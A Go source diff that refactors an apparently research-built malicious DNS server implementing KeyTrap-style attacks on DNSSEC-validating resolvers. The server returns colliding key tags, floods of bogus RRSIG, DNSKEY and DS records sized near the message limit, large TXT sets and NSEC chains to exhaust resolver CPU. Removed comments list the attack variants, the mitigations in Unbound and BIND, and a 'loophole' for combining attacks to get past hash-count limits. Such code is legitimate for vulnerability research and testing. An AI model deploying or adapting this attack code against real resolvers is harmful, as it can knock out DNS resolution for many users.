@@ -22,7 +22,20 @@ var ServerIP = net.IPv4(10, 10, 1, 4)
 var IsNameCompression = false
 var IsDNSSEC = true
 var InitTime = time.Now().UTC().Unix()
-var IsTCPEnabled = false
+
+var conf = xdns.ServerConfig{
+	IP:   net.IPv4(10, 10, 1, 4),
+	Port: 53,
+
+	// stdout
+	LogWriter: os.Stdout,
+
+	EnableCache:   false,
+	CacheLocation: "./cache",
+
+	EnableTCP:    false,
+	TCPThreshold: 1200,
+}
 
 var SOARDATA = &dns.DNSRDATASOA{
 	MName:   "ns.test",
@@ -36,7 +49,8 @@ var SOARDATA = &dns.DNSRDATASOA{
 
 // 测试向量
 var ExperiVec = AttackVector{
-	CollidedSigNum:        1,
+	// KeyTrap
+	CollidedSigNum:        0,
 	CollidedSigForRR:      0,
 	CollidedZSKNum:        0,
 	CollidedKSKNum:        0,
@@ -44,9 +58,22 @@ var ExperiVec = AttackVector{
 	CollidedDSNum:         0,
 	DynamicCollidedDSNum:  false,
 
+	// ANY
 	ANYRRSetNum: 0,
 
-	// SigPairTrap
+	// LRRSetTrap
+	TXTRRNum:     0,
+	TXTRDataSize: 16384,
+	// CNAMETrap
+	CNAMEChainNum: 0,
+	// ReferrerTrap
+	NSRRNum: 5,
+
+	// NSECTrap
+	IsNSEC:    true,
+	NSECRRNum: 8,
+
+	// TagTrap
 	ValidZSKNum:             0,
 	Invalid_SIG_ZSK_PairNum: 0,
 	SIGPairDecreaseFactor:   0,
@@ -64,83 +91,8 @@ var ExperiVec = AttackVector{
 	RandomTagDSNum:     0,
 	DynamicRandomDSNum: false,
 
-	TXTRRNum:          0,
-	TXTRDataSize:      16384,
-	CNAMEChainNum:     0,
-	NSRRNum:           5,
-	ReDelegationDepth: 0,
-
+	// AdditionalJam
 	AdditionalRRNum: 0,
-
-	IsNSEC:             true,
-	NSECRRNum:          8,
-	NSEC3ItertationNum: -1,
-	// www.atk.testd
-	// DNSSEC Query: #RRSIG  = CollidedSigNum + 1(Valid)
-	// DNSKEY Query: #DNSKEY = #ZSK && #KSK	= CollidedZSKNum + 1(Valid) && CollidedKSKNum + 1(Valid)
-	// DS     Query: #DS	 = Invalid_DS_KSK_PairNum * CollidedDSNum + 1(Valid)
-	// ANY    Query: #RRSet	 = ANYRRSettNum
-
-	// Adujust AttackVector --> Adjust KeyTrap Attack.
-
-	// KeyTrap Variants:
-	// 1. SigJam     (Validation Order✔️)  --> RRSIG* x  DNSKEY   --> CollidedSigNum  					(RRSIG Validation)
-	// 2. LockCram   (Validation Order❌)  --> RRSIG  x  DNSKEY*  --> CollidedZSKNum				   	   (RRSIG Validation)
-	// 3. KeySigTrap (Validation Order❌)  --> RRSIG* x  DNSKEY*  --> CollidedSigNum, CollidedZSKNum    (RRSIG Validation)
-	// 4. HashTrap   (Validation Order✔️)  --> DS*    x  DNSKEY*  --> CollidedDSNum, CollidedKSKNum		(Hash Calculation)
-	// X. ANY  	    (No Failure, #RRSet⬆️) --> (RRSIG, DNSKEY)*   --> ANYRRSettNum						(RRSIG Validation)
-
-	// Mitigation
-	// Limitaiton:
-	// 1. SigJam	  -->  #RRSIG* Limitation
-	// 2. LockCram	  -->  #DNSKEY* Limitation
-	// 3. KeySigTrap  -->  #RRSIG* && #DNSKEY* Limitation
-	// 4. HashTrap    -->  #DS* && #DNSKEY* Limitation
-	// X. ANY		  -->  #(RRSIG Val.) Limitation
-
-	// Mechanism:
-	// Suspend(Unbound)
-	// Workload balance(BIND)
-
-	// X. --> #(RRSIG Val.) Limitation --> Hard to bypass
-
-	// Loophole?
-	// Notice:	No (#Hash Cal.) Limitation
-	// Only:	#DS* && #DNSKEY* Limitation
-
-	// ANY + HashTrap:
-	// HashTrap:	DS* x DNSKEY*
-	// ANY:		   (RRSIG, DNSKEY)*
-	//
-	// HashTrap v2:	(DS, RRSIG)*
-	// If possible:	(DS*, RRSIG*)*
-	// HashTrap * Deep Delegation.
-
-	// Test config
-	// Delegation:
-	// test --> atk.test: 80 + 1 DS_KSK_Pair,
-
-	// 80 Invalid DS_KSK_Pair
-	// 1  Valid   DS_KSK_Pair  --> which signs ZSK's RRSIG
-
-	// 80 Invalid DS_KSK_Pair config:
-	// 10 KegTag== DS (CollidedDSNum)
-	// 5  KeyTag== KSK (CollidedKSKNum)
-
-	// 1 Valid DS_KSK_Pair config:
-	// 1 Right DS
-	// 1 Right KSK
-	// Make sure return NOERROR.
-
-	// DS Query:	 80*10 + 1 = 801(SHA384   DS)
-	// DNSKEY Query: 80*5  + 1 = 401(ECDSA384 DNSKEY)
-
-	// Size:
-	// 801 SHA384   DS  ~60KB
-	// 401 ECDSA384 KSK ~60KB  --> RSA... --> #KSK↑
-
-	// #Hash:
-	// 80*10*5+1 = 4000 SHA384 (plain text size: ~300B)
 }
 
 type KeyTrapResponser struct {
@@ -189,7 +141,6 @@ type AttackVector struct {
 	// AdditionalJam
 	AdditionalRRNum int
 
-	// Tricks
 	// Large RRSet
 	TXTRRNum int // Resource Record Numer in RRSet
 	// Large RDATA
@@ -200,12 +151,11 @@ type AttackVector struct {
 	CNAMEChainNum int // CNAME Chain Number
 
 	// NS Amplification
-	NSRRNum            int // Resource Record Numer in RRSet
-	ReDelegationDepth  int // ReDelegation Depth
-	IsNSEC             bool
-	NSECRRNum          int
-	NSEC3ItertationNum int    // NSEC3 Iteration Number
-	Salt               string // NSEC3 Salt
+	NSRRNum int // Resource Record Numer in RRSet
+
+	// NSECTrap
+	IsNSEC    bool
+	NSECRRNum int
 }
 
 type KeyTrapManager struct {
@@ -263,7 +213,7 @@ func (m *KeyTrapManager) SignSection(section []dns.DNSResourceRecord) []dns.DNSR
 			for i := 0; i < m.AttackVec.CollidedSigNum+m.AttackVec.CollidedSigForRR; i++ {
 				wRRSIG := xperi.GenerateRandomRRRRSIG(
 					rrset,
-					m.DNSSECConf.DAlgo,
+					m.DNSSECConf.Algo,
 					uint32(InitTime+86400),
 					uint32(InitTime),
 					uint16(dMat.ZSKTag),
@@ -278,7 +228,7 @@ func (m *KeyTrapManager) SignSection(section []dns.DNSResourceRecord) []dns.DNSR
 		for i := 0; i < m.AttackVec.RandomTagSigNum; i++ {
 			wRRSIG := xperi.GenerateRandomRRRRSIG(
 				rrset,
-				m.DNSSECConf.DAlgo,
+				m.DNSSECConf.Algo,
 				uint32(InitTime+86400),
 				uint32(InitTime),
 				uint16(rand.Intn(65535)),
@@ -292,7 +242,7 @@ func (m *KeyTrapManager) SignSection(section []dns.DNSResourceRecord) []dns.DNSR
 			for i := 0; i < m.AttackVec.ValidZSKNum; i++ {
 				wRRSIG := xperi.GenerateRandomRRRRSIG(
 					rrset,
-					m.DNSSECConf.DAlgo,
+					m.DNSSECConf.Algo,
 					uint32(InitTime+86400),
 					uint32(InitTime),
 					uint16(dMat.OtherZSKTag[i]),
@@ -307,7 +257,7 @@ func (m *KeyTrapManager) SignSection(section []dns.DNSResourceRecord) []dns.DNSR
 			for j := 0; j < m.AttackVec.InvalidCollidedSigNum; j++ {
 				wRRSIG := xperi.GenerateRandomRRRRSIG(
 					rrset,
-					m.DNSSECConf.DAlgo,
+					m.DNSSECConf.Algo,
 					uint32(InitTime+86400),
 					uint32(InitTime),
 					uint16(keytag),
@@ -398,10 +348,10 @@ func (m *KeyTrapManager) EnableDNSSEC(qry dns.DNSMessage, resp *dns.DNSMessage) 
 // 返回值为：
 //   - DNSSECMaterial，生成的 DNSSEC 材料
 func (m *KeyTrapManager) CreateDNSSECMaterial(zName string) DNSSECMaterial {
-	zskRecord, zskPriv := xperi.GenerateRRDNSKEY(zName, m.DNSSECConf.DAlgo, dns.DNSKEYFlagZoneKey)
+	zskRecord, zskPriv := xperi.GenerateRRDNSKEY(zName, m.DNSSECConf.Algo, dns.DNSKEYFlagZoneKey)
 	zskTag := xperi.CalculateKeyTag(*zskRecord.RData.(*dns.DNSRDATADNSKEY))
 	for zskTag < uint16(m.AttackVec.CollidedZSKNum) {
-		zskRecord, zskPriv = xperi.GenerateRRDNSKEY(zName, m.DNSSECConf.DAlgo, dns.DNSKEYFlagZoneKey)
+		zskRecord, zskPriv = xperi.GenerateRRDNSKEY(zName, m.DNSSECConf.Algo, dns.DNSKEYFlagZoneKey)
 		zskTag = xperi.CalculateKeyTag(*zskRecord.RData.(*dns.DNSRDATADNSKEY))
 	}
 
@@ -409,14 +359,14 @@ func (m *KeyTrapManager) CreateDNSSECMaterial(zName string) DNSSECMaterial {
 	autreZSKTag := []int{}
 	// SigPairTrap攻击向量：ValidZSKNum
 	for i := 0; i <= m.AttackVec.ValidZSKNum; i++ {
-		zzz, _ := xperi.GenerateRRDNSKEY(zName, m.DNSSECConf.DAlgo, dns.DNSKEYFlagZoneKey)
+		zzz, _ := xperi.GenerateRRDNSKEY(zName, m.DNSSECConf.Algo, dns.DNSKEYFlagZoneKey)
 		autreZSK = append(autreZSK, zzz)
 		autreZSKTag = append(autreZSKTag, int(xperi.CalculateKeyTag(*zzz.RData.(*dns.DNSRDATADNSKEY))))
 	}
 
-	kskRecord, kskPriv := xperi.GenerateRRDNSKEY(zName, m.DNSSECConf.DAlgo, dns.DNSKEYFlagSecureEntryPoint)
+	kskRecord, kskPriv := xperi.GenerateRRDNSKEY(zName, m.DNSSECConf.Algo, dns.DNSKEYFlagSecureEntryPoint)
 	kskTag := xperi.CalculateKeyTag(*kskRecord.RData.(*dns.DNSRDATADNSKEY))
-	kskRecord, kskPriv = xperi.GenerateRRDNSKEY(zName, m.DNSSECConf.DAlgo, dns.DNSKEYFlagSecureEntryPoint)
+	kskRecord, kskPriv = xperi.GenerateRRDNSKEY(zName, m.DNSSECConf.Algo, dns.DNSKEYFlagSecureEntryPoint)
 	kskTag = xperi.CalculateKeyTag(*kskRecord.RData.(*dns.DNSRDATADNSKEY))
 
 	return DNSSECMaterial{
@@ -520,7 +470,7 @@ func (m *KeyTrapManager) EstablishToC(qry dns.DNSMessage, resp *dns.DNSMessage) 
 				// (QNAME + 10 + 4 + PublicKeySize) * CollideKSKNum < 65535
 				// CollidedKSKNum < 65535 / (QNAME + 10 + 4 + PublicKeySize)
 				qNameSize := dns.GetDomainNameWireLen(&qName)
-				collidedKSKNum := 62000 / (qNameSize + 10 + 4 + dns.PubilcKeySizeOf(m.DNSSECConf.DAlgo))
+				collidedKSKNum := 62000 / (qNameSize + 10 + 4 + dns.PubilcKeySizeOf(m.DNSSECConf.Algo))
 				for i := 0; i < collidedKSKNum; i++ {
 					wKSK := xperi.GenerateCollidedDNSKEY(
 						*dMat.KSKRecord.RData.(*dns.DNSRDATADNSKEY),
@@ -568,12 +518,12 @@ func (m *KeyTrapManager) EstablishToC(qry dns.DNSMessage, resp *dns.DNSMessage) 
 				// 生成 错误KSK DNSKEY 记录
 				th := 12
 				tm := 0
-				rKSK, _ := xperi.GenerateRDATADNSKEY(m.DNSSECConf.DAlgo, dns.DNSKEYFlagSecureEntryPoint)
+				rKSK, _ := xperi.GenerateRDATADNSKEY(m.DNSSECConf.Algo, dns.DNSKEYFlagSecureEntryPoint)
 				for j := 1; j <= m.AttackVec.InvalidCollidedKSKNum; j++ {
 					tm = tm + 1
 					if tm > th {
 						tm = 0
-						rKSK, _ = xperi.GenerateRDATADNSKEY(m.DNSSECConf.DAlgo, dns.DNSKEYFlagSecureEntryPoint)
+						rKSK, _ = xperi.GenerateRDATADNSKEY(m.DNSSECConf.Algo, dns.DNSKEYFlagSecureEntryPoint)
 					}
 					rTag := xperi.CalculateKeyTag(rKSK)
 					tTag := uint16(dMat.KSKTag - i)
@@ -623,7 +573,7 @@ func (m *KeyTrapManager) EstablishToC(qry dns.DNSMessage, resp *dns.DNSMessage) 
 		for i := 0; i < m.AttackVec.CollidedSigNum; i++ {
 			wRRSIG := xperi.GenerateRandomRRRRSIG(
 				rrset,
-				m.DNSSECConf.DAlgo,
+				m.DNSSECConf.Algo,
 				uint32(InitTime+86400),
 				uint32(InitTime),
 				uint16(dMat.KSKTag),
@@ -659,8 +609,8 @@ func (m *KeyTrapManager) EstablishToC(qry dns.DNSMessage, resp *dns.DNSMessage) 
 			for i := 0; i < m.AttackVec.InvalidCollidedDSNum; i++ {
 				wDS := xperi.GenerateRandomRRDS(qName,
 					kskTag,
-					m.DNSSECConf.DAlgo,
-					m.DNSSECConf.DType)
+					m.DNSSECConf.Algo,
+					m.DNSSECConf.Type)
 				rrset = append(rrset, wDS)
 				resp.Answer = append(resp.Answer, wDS)
 			}
@@ -669,12 +619,12 @@ func (m *KeyTrapManager) EstablishToC(qry dns.DNSMessage, resp *dns.DNSMessage) 
 		// TagTrap攻击向量: RandomTagDSNum:
 		if m.AttackVec.DynamicRandomDSNum {
 			qNameSize := dns.GetDomainNameWireLen(&qName)
-			randomDSNum := 62000 / (qNameSize + 10 + 4 + dns.DigestSizeOf(m.DNSSECConf.DType))
+			randomDSNum := 62000 / (qNameSize + 10 + 4 + dns.DigestSizeOf(m.DNSSECConf.Type))
 			for i := 1; i <= randomDSNum; i++ {
 				wDS := xperi.GenerateRandomRRDS(qName,
 					rand.Intn(65535),
-					m.DNSSECConf.DAlgo,
-					m.DNSSECConf.DType)
+					m.DNSSECConf.Algo,
+					m.DNSSECConf.Type)
 				rrset = append(rrset, wDS)
 				resp.Answer = append(resp.Answer, wDS)
 			}
@@ -682,8 +632,8 @@ func (m *KeyTrapManager) EstablishToC(qry dns.DNSMessage, resp *dns.DNSMessage) 
 			for i := 1; i <= m.AttackVec.RandomTagDSNum; i++ {
 				wDS := xperi.GenerateRandomRRDS(qName,
 					rand.Intn(65535),
-					m.DNSSECConf.DAlgo,
-					m.DNSSECConf.DType)
+					m.DNSSECConf.Algo,
+					m.DNSSECConf.Type)
 				rrset = append(rrset, wDS)
 				resp.Answer = append(resp.Answer, wDS)
 			}
@@ -698,16 +648,16 @@ func (m *KeyTrapManager) EstablishToC(qry dns.DNSMessage, resp *dns.DNSMessage) 
 			// (QNAME + 10 + 52) * CollidedDSNum <= 65535
 			// CollidedDSNum <= 65535 / (QNAME + 10 + 4 + DigestSize)
 			qNameSize := dns.GetDomainNameWireLen(&qName)
-			collidedDSNum := 62000 / (qNameSize + 10 + 4 + dns.DigestSizeOf(m.DNSSECConf.DType))
-			fmt.Printf("CollidedDSNum: %d\n, DS Size: %d\n", collidedDSNum, qNameSize+10+4+dns.DigestSizeOf(m.DNSSECConf.DType))
+			collidedDSNum := 62000 / (qNameSize + 10 + 4 + dns.DigestSizeOf(m.DNSSECConf.Type))
+			fmt.Printf("CollidedDSNum: %d\n, DS Size: %d\n", collidedDSNum, qNameSize+10+4+dns.DigestSizeOf(m.DNSSECConf.Type))
 			for i := 0; i < collidedDSNum; i++ {
-				wDS := xperi.GenerateRandomRRDS(qName, dMat.KSKTag, m.DNSSECConf.DAlgo, m.DNSSECConf.DType)
+				wDS := xperi.GenerateRandomRRDS(qName, dMat.KSKTag, m.DNSSECConf.Algo, m.DNSSECConf.Type)
 				rrset = append(rrset, wDS)
 				resp.Answer = append(resp.Answer, wDS)
 			}
 		} else {
 			for i := 0; i < m.AttackVec.CollidedDSNum; i++ {
-				wDS := xperi.GenerateRandomRRDS(qName, dMat.KSKTag, m.DNSSECConf.DAlgo, m.DNSSECConf.DType)
+				wDS := xperi.GenerateRandomRRDS(qName, dMat.KSKTag, m.DNSSECConf.Algo, m.DNSSECConf.Type)
 				rrset = append(rrset, wDS)
 				resp.Answer = append(resp.Answer, wDS)
 			}
@@ -715,7 +665,7 @@ func (m *KeyTrapManager) EstablishToC(qry dns.DNSMessage, resp *dns.DNSMessage) 
 
 		// 生成正确DS记录
 		kskRData, _ := dMat.KSKRecord.RData.(*dns.DNSRDATADNSKEY)
-		ds := xperi.GenerateRRDS(qName, *kskRData, m.DNSSECConf.DType)
+		ds := xperi.GenerateRRDS(qName, *kskRData, m.DNSSECConf.Type)
 		rrset = append(rrset, ds)
 		resp.Answer = append(resp.Answer, ds)
 
@@ -731,7 +681,7 @@ func (m *KeyTrapManager) EstablishToC(qry dns.DNSMessage, resp *dns.DNSMessage) 
 		for i := 0; i < m.AttackVec.CollidedSigNum; i++ {
 			wRRSIG := xperi.GenerateRandomRRRRSIG(
 				rrset,
-				m.DNSSECConf.DAlgo,
+				m.DNSSECConf.Algo,
 				uint32(InitTime+86400),
 				uint32(InitTime),
 				uint16(dMat.ZSKTag),
@@ -745,7 +695,7 @@ func (m *KeyTrapManager) EstablishToC(qry dns.DNSMessage, resp *dns.DNSMessage) 
 		for i := 0; i < m.AttackVec.RandomTagSigNum; i++ {
 			wRRSIG := xperi.GenerateRandomRRRRSIG(
 				rrset,
-				m.DNSSECConf.DAlgo,
+				m.DNSSECConf.Algo,
 				uint32(InitTime+86400),
 				uint32(InitTime),
 				uint16(rand.Intn(65535)),
@@ -837,7 +787,7 @@ func (r *KeyTrapResponser) Response(connInfo xdns.ConnectionInfo) ([]byte, error
 				dMat := r.DNSSECManager.GetDNSSECMaterial(qName)
 				soasig := xperi.GenerateRRRRSIG(
 					[]dns.DNSResourceRecord{soa},
-					dns.DNSSECAlgorithm(r.DNSSECManager.DNSSECConf.DAlgo),
+					dns.DNSSECAlgorithm(r.DNSSECManager.DNSSECConf.Algo),
 					uint32(InitTime+86400),
 					uint32(InitTime),
 					uint16(dMat.ZSKTag),
@@ -865,7 +815,7 @@ func (r *KeyTrapResponser) Response(connInfo xdns.ConnectionInfo) ([]byte, error
 			for i := 0; i < r.AttackVector.CollidedSigForRR; i++ {
 				rrsig := xperi.GenerateRandomRRRRSIG(
 					[]dns.DNSResourceRecord{rra},
-					dns.DNSSECAlgorithm(r.DNSSECManager.DNSSECConf.DAlgo),
+					dns.DNSSECAlgorithm(r.DNSSECManager.DNSSECConf.Algo),
 					uint32(InitTime+86400),
 					uint32(InitTime),
 					uint16(dMat.ZSKTag),
@@ -877,33 +827,7 @@ func (r *KeyTrapResponser) Response(connInfo xdns.ConnectionInfo) ([]byte, error
 			xdns.FixCount(&resp)
 		}
 		data := resp.Encode()
-		if IsTCPEnabled && connInfo.Protocol == "udp" && len(data) > 1200 {
-			// 如果是UDP协议且数据包大于1200字节，则使用TCP协议回复
-			trMsg := &dns.DNSMessage{
-				Header: dns.DNSHeader{
-					ID:      resp.Header.ID,
-					QR:      true,
-					OpCode:  resp.Header.OpCode,
-					AA:      resp.Header.AA,
-					TC:      true,
-					RD:      resp.Header.RD,
-					RA:      resp.Header.RA,
-					Z:       resp.Header.Z,
-					RCode:   resp.Header.RCode,
-					QDCount: resp.Header.QDCount,
-					ANCount: resp.Header.ANCount,
-					NSCount: resp.Header.NSCount,
-					ARCount: resp.Header.ARCount,
-				},
-				Question:   resp.Question,
-				Answer:     []dns.DNSResourceRecord{},
-				Authority:  []dns.DNSResourceRecord{},
-				Additional: []dns.DNSResourceRecord{},
-			}
-			data = trMsg.Encode()
-		}
 		return data, nil
-
 	} else {
 		switch qType {
 		case dns.DNSRRTypeA:
@@ -950,72 +874,14 @@ func (r *KeyTrapResponser) Response(connInfo xdns.ConnectionInfo) ([]byte, error
 					// }
 					// resp.Authority = append(resp.Authority, soa)
 					randInt := rand.Int() % 99
-					if r.AttackVector.NSEC3ItertationNum > -1 {
-						//生成NSEC3记录
-						for i := 1; i < r.AttackVector.NSECRRNum; i++ {
-							//生成NSEC3记录
-							rdata := dns.DNSRDATANSEC3{
-								HashAlgorithm:       1,
-								Flags:               1,
-								Iterations:          uint16(r.AttackVector.NSEC3ItertationNum),
-								SaltLength:          0,
-								Salt:                r.AttackVector.Salt,
-								HashLength:          0,
-								NextHashedOwnerName: fmt.Sprintf("0%d.", randInt+i) + upperName,
-								TypeBitMaps:         []dns.DNSType{dns.DNSRRTypeA},
-							}
-							rr := dns.DNSResourceRecord{
-								Name:  fmt.Sprintf("0%d.", randInt+i-1) + upperName,
-								Type:  dns.DNSRRTypeNSEC3,
-								Class: dns.DNSClassIN,
-								TTL:   86400,
-								RDLen: 0,
-								RData: &rdata,
-							}
-							resp.Authority = append(resp.Authority, rr)
-						}
-						rdata := dns.DNSRDATANSEC3{
-							HashAlgorithm:       1,
-							Flags:               1,
-							Iterations:          uint16(r.AttackVector.NSEC3ItertationNum),
-							SaltLength:          0,
-							Salt:                r.AttackVector.Salt,
-							HashLength:          0,
-							NextHashedOwnerName: "zzz." + upperName,
-							TypeBitMaps:         []dns.DNSType{dns.DNSRRTypeA},
-						}
-						rr := dns.DNSResourceRecord{
-							Name:  fmt.Sprintf("0%d.", randInt+r.AttackVector.NSECRRNum) + upperName,
-							Type:  dns.DNSRRTypeNSEC3,
-							Class: dns.DNSClassIN,
-							TTL:   86400,
-							RDLen: 0,
-							RData: &rdata,
-						}
-						resp.Authority = append(resp.Authority, rr)
-					} else {
-						for i := 1; i < r.AttackVector.NSECRRNum; i++ {
-							//生成NSEC记录
-							rdata := dns.DNSRDATANSEC{
-								NextDomainName: fmt.Sprintf("0%d.", randInt+i) + upperName,
-								TypeBitMaps:    []dns.DNSType{dns.DNSRRTypeA},
-							}
-							rr := dns.DNSResourceRecord{
-								Name:  fmt.Sprintf("0%d.", randInt+i-1) + upperName,
-								Type:  dns.DNSRRTypeNSEC,
-								Class: dns.DNSClassIN,
-								TTL:   86400,
-								RDLen: 0,
-								RData: &rdata,
-							}
-							resp.Authority = append(resp.Authority, rr)
-						}
+					for i := 1; i < r.AttackVector.NSECRRNum; i++ {
+						//生成NSEC记录
 						rdata := dns.DNSRDATANSEC{
-							NextDomainName: "zzz." + upperName,
+							NextDomainName: fmt.Sprintf("0%d.", randInt+i) + upperName,
 							TypeBitMaps:    []dns.DNSType{dns.DNSRRTypeA},
 						}
 						rr := dns.DNSResourceRecord{
-							Name:  fmt.Sprintf("0%d.", randInt+r.AttackVector.NSECRRNum) + upperName,
+							Name:  fmt.Sprintf("0%d.", randInt+i-1) + upperName,
 							Type:  dns.DNSRRTypeNSEC,
 							Class: dns.DNSClassIN,
 							TTL:   86400,
@@ -1024,6 +890,19 @@ func (r *KeyTrapResponser) Response(connInfo xdns.ConnectionInfo) ([]byte, error
 						}
 						resp.Authority = append(resp.Authority, rr)
 					}
+					rdata := dns.DNSRDATANSEC{
+						NextDomainName: "zzz." + upperName,
+						TypeBitMaps:    []dns.DNSType{dns.DNSRRTypeA},
+					}
+					rr := dns.DNSResourceRecord{
+						Name:  fmt.Sprintf("0%d.", randInt+r.AttackVector.NSECRRNum) + upperName,
+						Type:  dns.DNSRRTypeNSEC,
+						Class: dns.DNSClassIN,
+						TTL:   86400,
+						RDLen: 0,
+						RData: &rdata,
+					}
+					resp.Authority = append(resp.Authority, rr)
 				} else {
 					if qLables[0] == "ns" {
 						if err != nil {
@@ -1163,47 +1042,26 @@ func (r *KeyTrapResponser) Response(connInfo xdns.ConnectionInfo) ([]byte, error
 		resp.Header.RCode = dns.DNSResponseCodeNXDomain
 		upperName := dns.GetUpperDomainName(&qName)
 		var rr dns.DNSResourceRecord
-		if ExperiVec.NSEC3ItertationNum > -1 {
-			//生成NSEC3记录
-			rdata := dns.DNSRDATANSEC3{
-				HashAlgorithm:       1,
-				Flags:               1,
-				Iterations:          uint16(ExperiVec.NSEC3ItertationNum),
-				SaltLength:          0,
-				Salt:                ExperiVec.Salt,
-				HashLength:          0,
-				NextHashedOwnerName: fmt.Sprintf("00%d.", rand.Int()%99) + upperName,
-				TypeBitMaps:         []dns.DNSType{dns.DNSRRTypeA},
-			}
-			rr = dns.DNSResourceRecord{
-				Name:  upperName,
-				Type:  dns.DNSRRTypeNSEC3,
-				Class: dns.DNSClassIN,
-				TTL:   86400,
-				RDLen: 0,
-				RData: &rdata,
-			}
-		} else {
-			//生成NSEC记录
-			rdata := dns.DNSRDATANSEC{
-				NextDomainName: fmt.Sprintf("00%d.", rand.Int()%99) + upperName,
-				TypeBitMaps:    []dns.DNSType{dns.DNSRRTypeA},
-			}
-			rr = dns.DNSResourceRecord{
-				Name:  upperName,
-				Type:  dns.DNSRRTypeNSEC,
-				Class: dns.DNSClassIN,
-				TTL:   86400,
-				RDLen: 0,
-				RData: &rdata,
-			}
+
+		//生成NSEC记录
+		rdata := dns.DNSRDATANSEC{
+			NextDomainName: fmt.Sprintf("00%d.", rand.Int()%99) + upperName,
+			TypeBitMaps:    []dns.DNSType{dns.DNSRRTypeA},
+		}
+		rr = dns.DNSResourceRecord{
+			Name:  upperName,
+			Type:  dns.DNSRRTypeNSEC,
+			Class: dns.DNSClassIN,
+			TTL:   86400,
+			RDLen: 0,
+			RData: &rdata,
 		}
 		resp.Authority = append(resp.Authority, rr)
 		dMat := r.DNSSECManager.GetDNSSECMaterial(upperName)
 		for i := 0; i < ExperiVec.CollidedSigNum-1; i++ {
 			wRRSIG := xperi.GenerateRandomRRRRSIG(
 				[]dns.DNSResourceRecord{rr},
-				r.DNSSECManager.DNSSECConf.DAlgo,
+				r.DNSSECManager.DNSSECConf.Algo,
 				uint32(InitTime+86400),
 				uint32(InitTime),
 				uint16(dMat.ZSKTag),
@@ -1213,7 +1071,7 @@ func (r *KeyTrapResponser) Response(connInfo xdns.ConnectionInfo) ([]byte, error
 		}
 		sig := xperi.GenerateRRRRSIG(
 			[]dns.DNSResourceRecord{rr},
-			r.DNSSECManager.DNSSECConf.DAlgo,
+			r.DNSSECManager.DNSSECConf.Algo,
 			uint32(InitTime+86400),
 			uint32(InitTime),
 			uint16(dMat.ZSKTag),
@@ -1228,34 +1086,6 @@ func (r *KeyTrapResponser) Response(connInfo xdns.ConnectionInfo) ([]byte, error
 	xdns.FixCount(&resp)
 
 	data := resp.Encode()
-
-	if IsTCPEnabled {
-		if len(data) > 1024 && connInfo.Protocol == "udp" {
-			// 如果回复信息长度大于 1200 字节，使用 TCP 协议返回
-			trMsg := dns.DNSMessage{
-				Header: dns.DNSHeader{
-					ID:      qry.Header.ID,
-					QR:      true,
-					OpCode:  qry.Header.OpCode,
-					AA:      true,
-					TC:      true,
-					RD:      qry.Header.RD,
-					RA:      qry.Header.RA,
-					Z:       qry.Header.Z,
-					RCode:   dns.DNSResponseCodeNoErr,
-					QDCount: 1,
-					ANCount: 0,
-					NSCount: 0,
-					ARCount: 0,
-				},
-				Question:   qry.Question,
-				Answer:     []dns.DNSResourceRecord{},
-				Authority:  []dns.DNSResourceRecord{},
-				Additional: []dns.DNSResourceRecord{},
-			}
-			data = trMsg.Encode()
-		}
-	}
 
 	// 是否启用名称压缩
 	if IsNameCompression {
@@ -1282,19 +1112,6 @@ func getRandomString(size int) string {
 }
 
 func main() {
-	conf := xdns.DNSServerConfig{
-		IP:   ServerIP,
-		Port: 53,
-
-		// stdout
-		LogWriter: os.Stdout,
-
-		EnebleCache:   false,
-		CacheLocation: "./cache",
-
-		PoolCapcity: -1,
-	}
-
 	// 生成 KSK 和 ZSK
 	// 使用ParseKeyBase64解析预先生成的公钥，
 	// 该公钥应确保能够被解析器通过 信任锚（Trust Anchor）建立的 信任链（Chain of Trust） 所验证。
@@ -1308,13 +1125,13 @@ func main() {
 
 	ExperiVec.RandomString = getRandomString(ExperiVec.TXTRDataSize)
 
-	server := xdns.NewxdnsServer(conf,
+	server := xdns.NewXdnsServer(conf,
 		&KeyTrapResponser{
 			ResponserLogger: log.New(conf.LogWriter, "KeyTrapResponser: ", log.LstdFlags),
 			DNSSECManager: KeyTrapManager{
 				DNSSECConf: xdns.DNSSECConfig{
-					DAlgo: dns.DNSSECAlgorithmECDSAP384SHA384,
-					DType: dns.DNSSECDigestTypeSHA384,
+					Algo: dns.DNSSECAlgorithmECDSAP384SHA384,
+					Type: dns.DNSSECDigestTypeSHA384,
 				},
 				DNSSECMap: dMap,
 				AttackVec: ExperiVec,
@@ -1337,7 +1154,7 @@ func main() {
 //   - map[string]DNSSECMaterial，生成的信任锚点
 func InitMaterial(name string, algo dns.DNSSECAlgorithm, kskPublic, kskPriv []byte) DNSSECMaterial {
 
-	// 为了对Referral思路进行测试，暂使用固定ZSK
+	// // 为了对Referral思路进行测试，暂使用固定ZSK
 	// zskRR, zskPriv := xperi.GenerateRRDNSKEY(name, algo, dns.DNSKEYFlagZoneKey)
 	zskPub, err := base64.StdEncoding.DecodeString("zNViYVKReDHMoe31Nj6S1nFgMg043Lk+6Gg4bESSw7QQPvcwxQp2yWVvtskCd9ysub0D4uMJY0g2QbW6AC+PhdUR8IPxRQASOBAl+8noHaOoq1nkaAnBcGCr/Gmpfz/D")
 	if err != nil {
